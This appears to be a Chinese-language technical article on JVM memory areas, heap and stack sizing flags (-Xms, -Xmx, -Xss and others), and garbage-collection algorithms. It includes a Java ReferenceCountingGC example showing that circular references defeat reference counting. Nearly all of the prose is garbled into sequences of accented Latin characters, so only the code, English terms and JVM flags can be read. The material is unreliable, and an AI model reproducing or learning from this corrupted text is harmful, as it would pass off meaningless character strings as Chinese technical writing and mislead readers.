è™šæ‹Ÿæœºæ‰€ç®¡ç†å†…å­˜æœ€å¤§çš„ä¸€å—ï¼Œå„ä¸ªçº¿ç¨‹ä¹‹é—´å…±äº«ï¼Œåœ¨è™šæ‹Ÿæœºå¯åŠ¨æ—¶åˆ›å»ºï¼Œæ­¤åŒºåŸŸçš„å”¯ä¸€ç›®çš„å°±æ˜¯å­˜æ”¾å®ä¾‹å¯¹è±¡ï¼Œå‡ ä¹æ‰€æœ‰çš„å®ä¾‹å¯¹è±¡éƒ½åœ¨è¿™é‡Œåˆ†é…å†…å­˜ã€‚å †å†…å­˜æ˜¯åƒåœ¾æ”¶é›†å™¨ï¼ˆGCï¼‰ç®¡ç†çš„ä¸»è¦åŒºåŸŸï¼Œå› æ­¤å¾ˆå¤šæ—¶å€™è¢«ç§°ä¸º â€œGC å †â€ã€‚ç”±äºç°åœ¨åƒåœ¾æ”¶é›†å™¨åŸºæœ¬é‡‡ç”¨åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œæ‰€ä»¥å †å†…å­˜è¿˜å¯ä»¥è¢«åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼Œè€Œæ–°ç”Ÿä»£å†…å­˜åˆè¢«åˆ†æˆ Eden ç©ºé—´ã€From Survivor ç©ºé—´ã€To Survivor ç©ºé—´ã€‚Java è™šæ‹Ÿæœºè§„èŒƒçš„è§„å®šï¼Œå †å†…å­˜å¯ä»¥åœ¨ç‰©ç†ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ä¸Šï¼Œåªè¦é€»è¾‘ä¸Šæ˜¯è¿ç»­çš„å³å¯ã€‚å¦‚æœåœ¨å †å†…å­˜ä¸­æ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜å®Œæˆå®ä¾‹åˆ†é…ï¼Œå¹¶ä¸”å †å†…å­˜ä¹Ÿæ— æ³•å†æ‰©å±•æ—¶ï¼Œå°†ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ æ–¹æ³•åŒºæ–¹æ³•åŒºï¼ˆMethod Areaï¼‰åŒ…å«äº†ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€å¸¸é‡ã€å¸¸é‡æ± ï¼Œæ˜¯å„ä¸ªçº¿ç¨‹å…±äº«çš„å†…å­˜åŒºåŸŸã€‚å®ƒå­˜å‚¨å·²è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€å¸¸é‡ã€å¸¸é‡æ± ï¼Œå³ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚ä¸ºäº†ä¸ Java å †åŒºåˆ†ï¼Œæ–¹æ³•åŒºè¿˜æœ‰ä¸€ä¸ªåˆ«å Non-Heap ï¼ˆéå †ï¼‰ã€‚å¯¹äºä¹ æƒ¯åœ¨ HotSpot è™šæ‹Ÿæœºä¸Šå¼€å‘å’Œéƒ¨ç½²ç¨‹åºçš„å¼€å‘è€…æ¥è¯´ï¼Œå¾ˆå¤šäººæ„¿æ„æŠŠæ–¹æ³•åŒºç§°ä¸ºâ€ æ°¸ä¹…ä»£â€ï¼ˆPermanent Generationï¼‰ï¼Œæœ¬è´¨ä¸Šä¸¤è€…å¹¶ä¸ç­‰ä»·ï¼Œä»…ä»…æ˜¯å› ä¸º HotSpot è™šæ‹Ÿæœºçš„è®¾è®¡å›¢é˜Ÿé€‰æ‹©æŠŠ GC åˆ†ä»£æ”¶é›†æ‰©å±•è‡³æ–¹æ³•åŒºï¼Œæˆ–è€…è¯´ä½¿ç”¨æ°¸ä¹…ä»£æ¥å®ç°æ–¹æ³•åŒºè€Œå·²ã€‚ç›¸å¯¹è€Œè¨€ï¼Œåƒåœ¾æ”¶é›†è¡Œä¸ºåœ¨è¿™ä¸ªåŒºåŸŸæ˜¯æ¯”è¾ƒå°‘å‡ºç°çš„ï¼Œä½†å¹¶éæ•°æ®è¿›å…¥äº†æ–¹æ³•åŒºå°±å¦‚æ°¸ä¹…ä»£çš„åå­—ä¸€æ ·â€ æ°¸ä¹…â€ å­˜åœ¨äº†ã€‚è¿™ä¸ªåŒºåŸŸçš„å†…å­˜å›æ”¶ç›®æ ‡ä¸»è¦æ˜¯é’ˆå¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»å‹çš„å¸è½½ï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸ªåŒºåŸŸçš„å›æ”¶ â€œæˆç»©â€ æ¯”è¾ƒéš¾ä»¥ä»¤äººæ»¡æ„ï¼Œå°¤å…¶æ˜¯ç±»å‹çš„å¸è½½ï¼Œæ¡ä»¶ç›¸å½“è‹›åˆ»ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†åŒºåŸŸçš„å›æ”¶ç¡®å®æ˜¯æœ‰å¿…è¦çš„ã€‚å½“æ–¹æ³•åŒºæ— æ³•æ»¡è¶³å†…å­˜åˆ†é…éœ€æ±‚æ—¶ï¼Œå°†æŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚æ–¹æ³•åŒºä¸­çš„å¸¸é‡å’Œé™æ€å˜é‡å¼•ç”¨çš„å¯¹è±¡ï¼Œå¯ä½œä¸º GC Rootã€‚ Java è™šæ‹Ÿæœºæ ˆJava è™šæ‹Ÿæœºæ ˆï¼ˆJava Virtual Machine Stacksï¼‰ï¼Œæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œç”Ÿå‘½å‘¨æœŸå’Œçº¿ç¨‹ç›¸åŒã€‚æ¯ä¸ªæ–¹æ³•æ‰§è¡Œçš„åŒæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆStacks Frameï¼‰ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯ã€‚æ–¹æ³•çš„æ‰§è¡Œï¼Œå¯¹åº”æ ˆå¸§åœ¨è™šæ‹Ÿæœºä¸­å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ï¼ˆä¸€å¥è¯æ€»ç»“ï¼šåˆ›å»ºæ ˆå¸§æ‰§è¡Œæ–¹æ³•ï¼Œç¨‹åºè®¡æ•°å™¨ä¼šæŒ‡å‘æ ˆé¡¶ï¼‰ã€‚å±€éƒ¨å˜é‡è¡¨å­˜æ”¾äº†ç¼–è¯‘æœŸå¯çŸ¥çš„å„ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆbooleanã€byteã€charã€shortã€intã€floatã€doubleã€longï¼‰ã€å¯¹è±¡å¼•ç”¨ï¼ˆReference ç±»å‹ï¼Œå®ƒä¸ç­‰åŒäºå¯¹è±¡æœ¬èº«ï¼Œæ ¹æ®ä¸åŒçš„è™šæ‹Ÿæœºå®ç°ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡èµ·å§‹åœ°å€çš„å¼•ç”¨æŒ‡é’ˆï¼Œä¹Ÿå¯èƒ½æŒ‡å‘ä¸€ä¸ªä»£è¡¨å¯¹è±¡çš„å¥æŸ„æˆ–è€…å…¶ä»–ä¸æ­¤å¯¹è±¡ç›¸å…³çš„ä½ç½®ï¼‰å’Œ ReturnAddress ç±»å‹ï¼ˆæŒ‡å‘äº†ä¸€æ¡å­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚å…¶ä¸­ 64 ä½é•¿åº¦çš„ long å’Œ double ç±»å‹çš„æ•°æ®ä¼šå ç”¨ 2 ä¸ªå±€éƒ¨å˜é‡ç©ºé—´ï¼ˆSlotï¼‰ï¼Œå…¶ä½™çš„æ•°æ®ç±»å‹åªå ç”¨ 1 ä¸ªã€‚å±€éƒ¨å˜é‡è¡¨æ‰€éœ€çš„å†…å­˜ç©ºé—´åœ¨ç¼–è¯‘æœŸé—´å®Œæˆåˆ†é…ï¼Œå½“è¿›å…¥ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦åœ¨å¸§ä¸­åˆ†é…å¤šå¤§çš„å±€éƒ¨å˜é‡ç©ºé—´æ˜¯å®Œå…¨ç¡®å®šçš„ï¼Œåœ¨æ–¹æ³•è¿è¡ŒæœŸé—´ä¸ä¼šæ”¹å˜å±€éƒ¨å˜é‡è¡¨çš„å¤§å°ã€‚åœ¨ Java è™šæ‹Ÿæœºè§„èŒƒä¸­ï¼Œå¯¹è¿™ä¸ªåŒºåŸŸè§„å®šäº†ä¸¤ç§å¼‚å¸¸çŠ¶å†µï¼šå¦‚æœçº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦å¤§äºè™šæ‹Ÿæœºæ‰€å…è®¸çš„æ·±åº¦ï¼Œå°†æŠ›å‡º StackOverflowError å¼‚å¸¸ï¼›å¦‚æœè™šæ‹Ÿæœºæ ˆå¯ä»¥åŠ¨æ€æ‰©å±•ï¼ˆå½“å‰å¤§éƒ¨åˆ†çš„ Java è™šæ‹Ÿæœºéƒ½æ”¯æŒåŠ¨æ€æ‰©å±•ï¼Œåªä¸è¿‡ Java è™šæ‹Ÿæœºè§„èŒƒä¸­ä¹Ÿå…è®¸å›ºå®šé•¿åº¦çš„è™šæ‹Ÿæœºæ ˆï¼‰ï¼Œå½“æ‰©å±•æ—¶æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿçš„å†…å­˜æ—¶ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚Java è™šæ‹Ÿæœºæ ˆå¼•ç”¨çš„å¯¹è±¡å¯ä½œä¸º GC Rootã€‚ æœ¬åœ°æ–¹æ³•æ ˆæœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Method Stackï¼‰ï¼Œä¸ Java è™šæ‹Ÿæœºæ ˆå‘æŒ¥çš„ä½œç”¨ç›¸ä¼¼ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ä¸è¿‡æ˜¯ Java è™šæ‹Ÿæœºæ ˆä¸ºè™šæ‹Ÿæœºæ‰§è¡Œ Java æ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯å­—èŠ‚ç ï¼‰æœåŠ¡ï¼Œè€Œæœ¬åœ°æ–¹æ³•æ ˆåˆ™ä¸ºè™šæ‹Ÿæœºä½¿ç”¨çš„ Native æ–¹æ³•æœåŠ¡ã€‚Java è™šæ‹Ÿæœºè§„èŒƒä¸­å¯¹æœ¬åœ°æ–¹æ³•æ ˆä¸­çš„æ–¹æ³•ä½¿ç”¨çš„è¯­è¨€ã€ä½¿ç”¨æ–¹å¼ä¸æ•°æ®ç»“æ„å¹¶æ²¡æœ‰å¼ºåˆ¶è§„å®šï¼Œå› æ­¤å…·ä½“çš„è™šæ‹Ÿæœºå¯ä»¥è‡ªç”±å®ç°å®ƒã€‚ç”šè‡³æœ‰çš„è™šæ‹Ÿæœºï¼ˆè­¬å¦‚ Sun HotSpot è™šæ‹Ÿæœºï¼‰ç›´æ¥å°±æŠŠæœ¬åœ°æ–¹æ³•æ ˆå’Œ Java è™šæ‹Ÿæœºæ ˆåˆäºŒä¸ºä¸€ã€‚ä¸ Java è™šæ‹Ÿæœºæ ˆä¸€æ ·ï¼Œæœ¬åœ°æ–¹æ³•æ ˆåŒºåŸŸä¹Ÿä¼šæŠ›å‡º StackOverflowError å’Œ OutOfMemoryError å¼‚å¸¸ã€‚æœ¬åœ°æ–¹æ³•æ ˆ Native æ–¹æ³•å¼•ç”¨çš„å¯¹è±¡å¯ä½œä¸º GC Rootã€‚ ç¨‹åºè®¡æ•°å™¨ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰æ˜¯ä¸€å—è¾ƒå°çš„å†…å­˜ç©ºé—´ï¼Œå®ƒçš„ä½œç”¨å¯ä»¥çœ‹åšæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ï¼Œå³ä¿è¯çº¿ç¨‹åˆ‡æ¢åæ¢å¤åˆ°æ­£ç¡®çš„æ‰§è¡Œä½ç½®ã€‚åœ¨è™šæ‹Ÿæœºçš„æ¦‚å¿µæ¨¡å‹é‡Œï¼ˆä»…æ˜¯æ¦‚å¿µæ¨¡å‹ï¼Œå„ç§è™šæ‹Ÿæœºå¯èƒ½ä¼šé€šè¿‡ä¸€äº›æ›´é«˜æ•ˆçš„æ–¹å¼å»å®ç°ï¼‰ï¼Œå­—èŠ‚ç è§£é‡Šå™¨å·¥ä½œæ—¶å°±æ˜¯é€šè¿‡æ”¹å˜è¿™ä¸ªè®¡æ•°å™¨çš„å€¼æ¥é€‰å–ä¸‹ä¸€æ¡éœ€è¦æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤ï¼Œåˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰åŸºç¡€åŠŸèƒ½éƒ½éœ€è¦ä¾èµ–è¿™ä¸ªè®¡æ•°å™¨æ¥å®Œæˆã€‚ç”±äº Java è™šæ‹Ÿæœºçš„å¤šçº¿ç¨‹æ˜¯é€šè¿‡çº¿ç¨‹åˆ‡æ¢å¹¶è·å–æ—¶é—´ç‰‡çš„æ–¹å¼æ¥å®ç°çš„ï¼Œåœ¨ä»»ä½•ä¸€ä¸ªç¡®å®šçš„æ—¶åˆ»ï¼Œä¸€ä¸ªå¤„ç†å™¨ï¼ˆå¯¹äºå¤šæ ¸å¤„ç†å™¨æ¥è¯´æ˜¯ä¸€ä¸ªå†…æ ¸ï¼‰åªä¼šæ‰§è¡Œä¸€æ¡çº¿ç¨‹ä¸­çš„æŒ‡ä»¤ã€‚å› æ­¤ï¼Œä¸ºäº†çº¿ç¨‹åˆ‡æ¢åèƒ½æ¢å¤åˆ°æ­£ç¡®çš„æ‰§è¡Œä½ç½®ï¼Œæ¯æ¡çº¿ç¨‹éƒ½éœ€è¦æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç¨‹åºè®¡æ•°å™¨ï¼Œå„æ¡çº¿ç¨‹ä¹‹é—´çš„è®¡æ•°å™¨äº’ä¸å½±å“ï¼Œç‹¬ç«‹å­˜å‚¨ï¼Œä¸€èˆ¬ç§°è¿™ç±»å†…å­˜åŒºåŸŸä¸º â€œçº¿ç¨‹ç§æœ‰â€ çš„å†…å­˜ã€‚å¦‚æœçº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„æ˜¯ä¸€ä¸ª Java æ–¹æ³•ï¼Œè¿™ä¸ªè®¡æ•°å™¨è®°å½•çš„æ˜¯æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ã€‚å¦‚æœæ­£åœ¨æ‰§è¡Œçš„æ˜¯ Natvie æ–¹æ³•ï¼Œè¿™ä¸ªè®¡æ•°å™¨å€¼åˆ™ä¸ºç©ºï¼ˆUndefinedï¼‰ã€‚æ­¤å†…å­˜åŒºåŸŸæ˜¯å”¯ä¸€ä¸€ä¸ªåœ¨ Java è™šæ‹Ÿæœºè§„èŒƒä¸­æ²¡æœ‰è§„å®šä»»ä½• OutOfMemoryError å¼‚å¸¸æƒ…å†µçš„åŒºåŸŸã€‚ è¿è¡Œæ—¶å¸¸é‡æ± è¿è¡Œæ—¶å¸¸é‡æ± ï¼ˆRuntime Constant Poolï¼‰æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜æ”¾ç¼–è¯‘æœŸç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚è¿™éƒ¨åˆ†å†…å®¹åœ¨ç±»åŠ è½½åè¿›å…¥æ–¹æ³•åŒºçš„è¿è¡Œæ—¶å¸¸é‡æ± å­˜æ”¾ã€‚è¿è¡Œæ—¶å¸¸é‡æ± å¦ä¸€ä¸ªé‡è¦ç‰¹å¾å°±æ˜¯å…·æœ‰åŠ¨æ€æ€§ã€‚Java è¯­è¨€å¹¶ä¸è¦æ±‚å¸¸é‡ä¸€å®šåªæœ‰ç¼–è¯‘æœŸæ‰èƒ½äº§ç”Ÿï¼Œè¿è¡ŒæœŸé—´ä¹Ÿå¯ä»¥å°†æ–°çš„å¸¸é‡æ”¾å…¥æ± ä¸­ï¼Œè¿™ç§ç‰¹æ€§è¢«å¼€å‘äººå‘˜åˆ©ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯ String ç±»çš„ intern() æ–¹æ³•ã€‚ ç›´æ¥å†…å­˜ç›´æ¥å†…å­˜ï¼ˆDirect Memoryï¼‰å¹¶ä¸æ˜¯è™šæ‹Ÿæœºè¿è¡Œæ—¶æ•°æ®åŒºçš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿä¸æ˜¯ Java è™šæ‹Ÿæœºè§„èŒƒä¸­å®šä¹‰çš„å†…å­˜åŒºåŸŸï¼Œä½†æ˜¯è¿™éƒ¨åˆ†å†…å­˜ä¹Ÿè¢«é¢‘ç¹çš„ä½¿ç”¨ï¼Œè€Œä¸”ä¹Ÿå¯èƒ½å¯¼è‡´ OutOfMemoryError å¼‚å¸¸ã€‚åœ¨ JDK1.4 ä¸­æ–°åŠ å…¥çš„ NIO ç±»ï¼Œå¼•å…¥äº†ä¸€ç§åŸºäºé€šé“ï¼ˆChannelï¼‰ä¸ç¼“å­˜åŒºï¼ˆBufferï¼‰çš„ I/O æ–¹å¼ã€‚å®ƒå¯ä»¥ä½¿ç”¨ Native å‡½æ•°åº“ç›´æ¥åˆ†é…å †å¤–å†…å­˜ï¼Œç„¶åé€šè¿‡ä¸€ä¸ªå­˜å‚¨åœ¨ Java å †ä¸­çš„ DirectByteBuffer å¯¹è±¡ä½œä¸ºè¿™å—å†…å­˜çš„å¼•ç”¨è¿›è¡Œæ“ä½œã€‚è¿™æ ·èƒ½åœ¨ä¸€äº›åœºæ™¯ä¸­æé«˜æ€§èƒ½ï¼Œå› ä¸ºé¿å…äº† Java å †å’Œ Native å †ä¸­æ¥å›å¤åˆ¶æ•°æ®ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæœ¬æœºçš„ç›´æ¥å†…å­˜çš„åˆ†é…ä¸ä¼šå—åˆ° Java å †å¤§å°çš„é™åˆ¶ï¼Œä½†æ˜¯ä¼šå—åˆ°æœ¬æœºæ€»å†…å­˜çš„é™åˆ¶ï¼Œè¿™å¯èƒ½å¯¼è‡´å„ä¸ªå†…å­˜åŒºåŸŸæ€»å’Œå¤§äºç‰©ç†å†…å­˜çš„é™åˆ¶ï¼Œä»è€Œå¯¼è‡´åŠ¨æ€æ‰©å±•æ—¶å‡ºç° OutOfMemoryError å¼‚å¸¸ã€‚ é€šè¿‡å‚æ•°æ¥æ§åˆ¶å„åŒºåŸŸçš„å†…å­˜å¤§å° -Xmsï¼Œè®¾ç½®å †å†…å­˜çš„æœ€å°ç©ºé—´å¤§å° -Xmxï¼Œè®¾ç½®å †å†…å­˜çš„æœ€å¤§ç©ºé—´å¤§å° -XX:NewSizeï¼Œè®¾ç½®æ–°ç”Ÿä»£æœ€å°ç©ºé—´å¤§å° -XX:MaxNewSizeï¼Œè®¾ç½®æ–°ç”Ÿä»£æœ€å¤§ç©ºé—´å¤§å° -XX:PermSizeï¼Œè®¾ç½®æ°¸ä¹…ä»£ï¼ˆæ–¹æ³•åŒºï¼‰æœ€å°ç©ºé—´å¤§å° -XX:MaxPermSizeï¼Œè®¾ç½®æ°¸ä¹…ä»£ï¼ˆæ–¹æ³•åŒºï¼‰æœ€å¤§ç©ºé—´å¤§å° -Xssï¼Œè®¾ç½®æ¯ä¸ªçº¿ç¨‹çš„å †æ ˆå¤§å° ç‰¹åˆ«æ³¨æ„ï¼šJVM æ²¡æœ‰æä¾›ç›´æ¥è®¾ç½®è€å¹´ä»£çš„å‚æ•°ï¼Œä½†æ˜¯å¯ä»¥è®¾ç½®å †ç©ºé—´å¤§å°å’Œæ–°ç”Ÿä»£ç©ºé—´å¤§å°æ¥é—´æ¥æ§åˆ¶ï¼Œè€å¹´ä»£ç©ºé—´å¤§å° = å †ç©ºé—´å¤§å° - æ–°ç”Ÿä»£å¤§ç©ºé—´å¤§å° JVM åƒåœ¾æ”¶é›†æœºåˆ¶å¦‚ä½•ç¡®å®šä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¼šè¢«å›æ”¶å¼•ç”¨è®¡æ•°ç®—æ³•ï¼ˆReference Countingï¼‰å¼•ç”¨è®¡æ•°ç®—æ³•æ˜¯é€šè¿‡åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨æ•°é‡æ¥å†³å®šå¯¹è±¡æ˜¯å¦å¯ä»¥è¢«å›æ”¶ã€‚å®ƒçš„æ€è·¯æ˜¯ç»™å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“æœ‰ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±åŠ  1ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡ 1ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸º 0 çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚å¤§éƒ¨åˆ†åœºæ™¯ä¸‹ï¼Œè¿™ä¸ªç®—æ³•éƒ½æ˜¯ä¸é”™ï¼Œæ•ˆç‡ä¹Ÿæ¯”è¾ƒé«˜ï¼›ä½†æ˜¯ Java è™šæ‹Ÿæœºé‡Œé¢æ²¡æœ‰é€‰ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•æ¥ç®¡ç†å†…å­˜ï¼Œå…¶ä¸­æœ€ä¸»è¦çš„åŸå› æ˜¯å®ƒå¾ˆéš¾è§£å†³å¯¹è±¡ä¹‹é—´ç›¸äº’å¾ªç¯å¼•ç”¨çš„é—®é¢˜ï¼›è€Œä¸”å¯¹å¯¹è±¡èµ‹å€¼æ—¶å‡è¦ç»´æŠ¤å¼•ç”¨è®¡æ•°å™¨ï¼ŒåŒæ—¶è®¡æ•°å™¨æœ¬èº«ä¹Ÿæœ‰ä¸€å®šçš„æ¶ˆè€—ã€‚ 123456789101112131415161718192021222324252627282930/** * å¼•ç”¨è®¡æ•°ç®—æ³•çš„ç¼ºé™· */public class ReferenceCountingGC { public Object instance = null; public static final int _1MB = 1024 * 1024; /** * å ç‚¹å†…å­˜ï¼Œä»¥ä¾¿GCæ—¥å¿—è§‚çœ‹ */ private byte[] bigSize = new byte[2 * _1MB]; public static void main(String[] args) { testGC(); } public static void testGC() { ReferenceCountingGC objA = new ReferenceCountingGC(); ReferenceCountingGC objB = new ReferenceCountingGC(); objA.instance = objB; objB.instance = objA; objA = null; objB = null; //è¿™é‡Œå‘ç”ŸGCï¼Œ objA å’Œ objBèƒ½å¦è¢«å›æ”¶ï¼Ÿ System.gc(); }} ä¸Šè¿°ä»£ç æœ€åé¢ä¸¤å¥å°† objA å’Œ objB èµ‹å€¼ä¸º nullï¼Œä¹Ÿå°±æ˜¯è¯´ objA å’Œ objB æŒ‡å‘çš„å¯¹è±¡å·²ç»ä¸å¯èƒ½å†è¢«è®¿é—®ï¼Œä½†æ˜¯ç”±äºå®ƒä»¬äº’ç›¸å¼•ç”¨å¯¹æ–¹ï¼Œå¯¼è‡´å®ƒä»¬çš„å¼•ç”¨è®¡æ•°å™¨éƒ½ä¸ä¸º 0ï¼Œé‚£ä¹ˆåƒåœ¾æ”¶é›†å™¨å°±æ°¸è¿œä¸ä¼šå›æ”¶å®ƒä»¬ã€‚ å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆReachability Analysisï¼‰åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨é“¾æ˜¯å¦å¯è¾¾ã€‚å®ƒçš„æ€è·¯æ˜¯ï¼šé€šè¿‡ä¸€ç³»åˆ—çš„ç§°ä¸º â€œGC Rootsâ€ çš„å¯¹è±¡ä½œä¸ºèµ·å§‹ç‚¹ï¼Œä»è¿™äº›èŠ‚ç‚¹å¼€å§‹å‘ä¸‹æœç´¢ï¼Œæœç´¢æ‰€èµ°è¿‡çš„è·¯å¾„ç§°ä¸ºå¼•ç”¨é“¾ï¼ˆReference Chainï¼‰ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ° GC Roots æ²¡æœ‰ä»»ä½•å¼•ç”¨é“¾ç›¸è¿ï¼ˆç”¨å›¾è®ºçš„è¯æ¥è¯´å°±æ˜¯ä» GC Roots åˆ°è¿™ä¸ªå¯¹è±¡ä¸å¯è¾¾ï¼‰æ—¶ï¼Œåˆ™è¯æ˜æ­¤å¯¹è±¡æ˜¯ä¸å¯ç”¨çš„ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š åœ¨ Java ä¸­ï¼Œå¯ä½œä¸º GC Root çš„å¯¹è±¡åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ï¼š æ–¹æ³•åŒºä¸­å¸¸é‡å¼•ç”¨çš„å¯¹è±¡ æ–¹æ³•åŒºä¸­ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡ Java è™šæ‹Ÿæœºæ ˆï¼ˆæ ˆå¸§ä¸­çš„å±€éƒ¨å˜é‡è¡¨ï¼‰ä¸­å¼•ç”¨çš„å¯¹è±¡ æœ¬åœ°æ–¹æ³•æ ˆä¸­ JNIï¼ˆå³ä¸€èˆ¬è¯´çš„ Native æ–¹æ³•ï¼‰å¼•ç”¨çš„å¯¹è±¡ GC ç®—æ³•åƒåœ¾æ”¶é›†ç®—æ³•ä¸»è¦æœ‰ï¼šå¤åˆ¶ç®—æ³•ï¼ˆCopyingï¼‰ã€æ ‡è®° - æ¸…é™¤ç®—æ³•ï¼ˆMark-Sweepï¼‰ã€æ ‡è®° - æ•´ç†ç®—æ³•ï¼ˆMark-Compactï¼‰ã€åˆ†ä»£æ”¶é›†ç®—æ³•ï¼ˆGenerational Collectionï¼‰ã€‚ æ ‡è®° - æ¸…é™¤ç®—æ³•â€œæ ‡è®° - æ¸…é™¤â€ ç®—æ³•æ˜¯æœ€åŸºç¡€çš„ç®—æ³•ï¼Œå®ƒåˆ†ä¸º â€œæ ‡è®°â€ å’Œâ€ æ¸…é™¤â€ ä¸¤ä¸ªé˜¶æ®µï¼šé¦–å…ˆæ ‡è®°å‡ºæ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåœ¨æ ‡è®°å®Œæˆåç»Ÿä¸€å›æ”¶æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡ã€‚å®ƒæœ‰ä¸¤ä¸ªä¸è¶³ï¼šä¸€ä¸ªæ˜¯æ•ˆç‡é—®é¢˜ï¼Œæ ‡è®°å’Œæ¸…é™¤ä¸¤ä¸ªè¿‡ç¨‹çš„æ•ˆç‡éƒ½ä¸é«˜ï¼ˆä¸¤æ¬¡æ‰«æï¼Œè€—æ—¶ä¸¥é‡ï¼‰ï¼›å¦ä¸€ä¸ªæ˜¯ç©ºé—´é—®é¢˜ï¼Œæ ‡è®°æ¸…é™¤ä¹‹åä¼šäº§ç”Ÿå¤§é‡çš„ä¸è¿ç»­çš„å†…å­˜ç¢ç‰‡ï¼Œç©ºé—´ç¢ç‰‡å¤ªå¤šå¯èƒ½ä¼šå¯¼è‡´ä»¥ååœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­éœ€è¦åˆ†é…è¾ƒå¤§å¯¹è±¡æ—¶ï¼Œæ— æ³•æ‰¾åˆ°è¶³å¤Ÿçš„è¿ç»­å†…å­˜ä»è€Œä¸å¾—ä¸æå‰è§¦å‘å¦ä¸€æ¬¡åƒåœ¾æ”¶é›†åŠ¨ä½œã€‚ å¤åˆ¶ç®—æ³• ä¸ºäº†è§£å†³æ•ˆç‡é—®é¢˜ï¼Œä¸€ç§ç§°ä¸º â€œå¤åˆ¶â€ï¼ˆCopyingï¼‰çš„æ”¶é›†ç®—æ³•å‡ºç°äº†ï¼Œå®ƒå°†å¯ç”¨å†…å­˜æŒ‰å®¹é‡åˆ’åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„ä¸¤å—ï¼Œæ¯æ¬¡åªä½¿ç”¨å…¶ä¸­çš„ä¸€å—ã€‚å½“è¿™å—çš„å†…å­˜ç”¨å®Œäº†ï¼Œå°±å°†è¿˜å­˜æ´»ç€çš„å¯¹è±¡å¤åˆ¶åˆ°å¦ä¸€å—ä¸Šé¢ï¼Œç„¶åå†æŠŠå·²ä½¿ç”¨è¿‡çš„å†…å­˜ç©ºé—´ä¸€æ¬¡æ¸…ç†æ‰ã€‚è¿™æ ·ä½¿å¾—æ¯æ¬¡éƒ½æ˜¯å¯¹æ•´ä¸ªåŠåŒºè¿›è¡Œå†…å­˜å›æ”¶ï¼Œå†…å­˜åˆ†é…æ—¶ä¹Ÿå°±ä¸ç”¨è€ƒè™‘å†…å­˜ç¢ç‰‡ç­‰å¤æ‚æƒ…å†µï¼Œåªè¦ç§»åŠ¨å †é¡¶æŒ‡é’ˆï¼ŒæŒ‰é¡ºåºåˆ†é…å†…å­˜å³å¯ï¼Œå®ç°ç®€å•ï¼Œè¿è¡Œé«˜æ•ˆã€‚ 